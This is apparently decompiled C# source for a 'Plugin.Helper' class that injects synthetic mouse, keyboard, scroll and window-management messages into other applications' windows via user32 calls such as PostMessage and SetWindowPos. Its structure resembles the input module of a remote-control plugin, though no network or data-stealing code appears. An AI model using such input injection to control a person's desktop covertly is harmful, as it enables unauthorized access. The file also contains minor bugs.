using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Plugin.Helper;

public class HandelMouse
{
	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public const int TitleHandel1 = 2;

	public const int TitleHandel2 = 12;

	public const int IsCloseHandel = 20;

	public const int CloseHandel = 16;

	public const int SetHandelValue = 132;

	public const int IsHideHandel = 8;

	public const int IsShowHandel = 9;

	public static IntPtr ActiveHandel;

	private static IntPtr IsActiveintPtr;

	private static IntPtr MoveHandel;

	private static IntPtr ResizeHandel;

	private static IntPtr Contex;

	public static int CopyX;

	public static int CopyY;

	private static int Xwidth;

	private static int Yheight;

	private static bool RightClick;

	public static int TTTT;

	public static bool IsMovemouse;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool IsZoomed(IntPtr hWnd);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

	[DllImport("user32.dll")]
	public static extern IntPtr WindowFromPoint(Point p);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetParent(IntPtr hWnd);

	public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
	{
		return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, State: false);
	}

	public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
	{
		return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore: true, State: true);
	}

	public static int MakeLParam(int LoWord, int HiWord)
	{
		return (HiWord << 16) | (LoWord & 0xFFFF);
	}

	public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
	{
		int num = RepeatCount | (ushort)(ScanCode << 16);
		if (IsExtendedKey)
		{
			num |= 0x10000;
		}
		if (DownBefore)
		{
			num |= 0x40000000;
		}
		if (State)
		{
			num = (int)((long)num | -2147483648L);
		}
		return new IntPtr(num);
	}

	public static void MouseLeftDown(int x, int y)
	{
		IntPtr intPtr = (ActiveHandel = WindowFromPoint(new Point(x, y)));
		GetWindowRect(intPtr, out var lpRect);
		Point point = new Point(x - lpRect.Left, y - lpRect.Top);
		int num = SendMessage(intPtr, 132, IntPtr.Zero, (IntPtr)MakeLParam(x, y));
		IntPtr intPtr2 = FindWindow("#32768", null);
		switch (num)
		{
		case 8:
			ShowWindow(intPtr, 6);
			return;
		case 9:
			if (IsZoomed(intPtr))
			{
				ShowWindow(IsActiveintPtr, 9);
			}
			else
			{
				ShowWindow(IsActiveintPtr, 3);
			}
			return;
		case 20:
			PostMessage(intPtr, 16u, IntPtr.Zero, IntPtr.Zero);
			return;
		}
		if (intPtr2 != IntPtr.Zero)
		{
			Contex = intPtr2;
			IntPtr lParam = (IntPtr)MakeLParam(x, y);
			PostMessage(Contex, 513u, new IntPtr(1), lParam);
			RightClick = true;
		}
		else if (GetParent(intPtr) == IntPtr.Zero && y - lpRect.Top < TTTT)
		{
			IsActiveintPtr = intPtr;
			PostMessage(intPtr, 513u, (IntPtr)1, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			CopyY = x;
			CopyY = y;
			MoveHandel = intPtr;
			SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3u);
			SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3u);
			SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67u);
		}
		else if (GetParent(intPtr) != IntPtr.Zero || point.X <= lpRect.Right - lpRect.Left - 10 || point.Y <= lpRect.Bottom - lpRect.Top - 10)
		{
			PostMessage(intPtr, 513u, (IntPtr)1, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
		}
		else
		{
			Xwidth = x;
			Yheight = y;
			ResizeHandel = intPtr;
		}
	}

	public static void MouseLeftUp(int x, int y)
	{
		IntPtr hWnd = WindowFromPoint(new Point(x, y));
		GetWindowRect(hWnd, out var lpRect);
		if (RightClick)
		{
			PostMessage(Contex, 514u, new IntPtr(1), (IntPtr)MakeLParam(x, y));
			RightClick = false;
			Contex = IntPtr.Zero;
			return;
		}
		if (MoveHandel != IntPtr.Zero)
		{
			CopyX = 0;
			CopyY = 0;
			MoveHandel = IntPtr.Zero;
			return;
		}
		if (!((Xwidth > 0) | (Yheight > 0)))
		{
			PostMessage(hWnd, 514u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			return;
		}
		GetWindowRect(ResizeHandel, out var lpRect2);
		int num = x - Xwidth;
		int num2 = y - Yheight;
		int cx = lpRect2.Right - lpRect2.Left + num;
		SetWindowPos(ResizeHandel, new IntPtr(0), lpRect2.Left, lpRect2.Top, cx, lpRect2.Bottom - lpRect2.Top + num2, 64u);
		Xwidth = 0;
		Yheight = 0;
		ResizeHandel = IntPtr.Zero;
	}

	public static void MouseRightDown(int x, int y)
	{
		GetWindowRect(WindowFromPoint(new Point(x, y)), out var lpRect);
		PostMessage(ActiveHandel = WindowFromPoint(new Point(x, y)), 516u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
	}

	public static void MouseRightUp(int x, int y)
	{
		GetWindowRect(WindowFromPoint(new Point(x, y)), out var lpRect);
		PostMessage(WindowFromPoint(new Point(x, y)), 517u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
	}

	public static void MouseDuoblClieck(int x, int y)
	{
		GetWindowRect(WindowFromPoint(new Point(x, y)), out var lpRect);
		PostMessage(ActiveHandel = WindowFromPoint(new Point(x, y)), 515u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
	}

	public static void MouseMove(int x, int y)
	{
		GetWindowRect(WindowFromPoint(new Point(x, y)), out var lpRect);
		if (MoveHandel != IntPtr.Zero)
		{
			PostMessage(MoveHandel, 514u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			GetWindowRect(MoveHandel, out var lpRect2);
			int num = lpRect2.Right - lpRect2.Left;
			int cy = lpRect2.Bottom - lpRect2.Top;
			SetWindowPos(MoveHandel, new IntPtr(0), x - num / 2, y, num, cy, 64u);
			CopyX = x;
			CopyY = y;
		}
		else
		{
			IntPtr hWnd = WindowFromPoint(new Point(x, y));
			GetWindowRect(hWnd, out var lpRect3);
			PostMessage(hWnd, 512u, (IntPtr)0, (IntPtr)MakeLParam(x - lpRect3.Left, y - lpRect3.Top));
		}
	}

	public static void KeyboardUp(int k)
	{
		PostMessage(ActiveHandel, 257u, (IntPtr)k, CreateLParamFor_WM_KEYUP(1, 30, IsExtendedKey: false));
	}

	public static void KeyboardDown(int k)
	{
		PostMessage(ActiveHandel, 256u, (IntPtr)k, CreateLParamFor_WM_KEYDOWN(1, 30, IsExtendedKey: false, DownBefore: false));
	}

	public static void ScrollDown()
	{
		IntPtr activeHandel = ActiveHandel;
		if (activeHandel != IntPtr.Zero)
		{
			SendMessage(activeHandel, 277, new IntPtr(1), IntPtr.Zero);
		}
	}

	public static void ScrollUp()
	{
		IntPtr activeHandel = ActiveHandel;
		if (activeHandel != IntPtr.Zero)
		{
			SendMessage(activeHandel, 277, new IntPtr(0), IntPtr.Zero);
		}
	}

	public static void CloseWindow()
	{
		SendMessage(IsActiveintPtr, 16, (IntPtr)0, (IntPtr)0);
	}

	public static void MinTop()
	{
		ShowWindow(IsActiveintPtr, 6);
	}

	public static void RestoreMaxTop()
	{
		IntPtr isActiveintPtr = IsActiveintPtr;
		if (IsZoomed(isActiveintPtr))
		{
			ShowWindow(isActiveintPtr, 9);
		}
		else
		{
			ShowWindow(isActiveintPtr, 3);
		}
	}
}
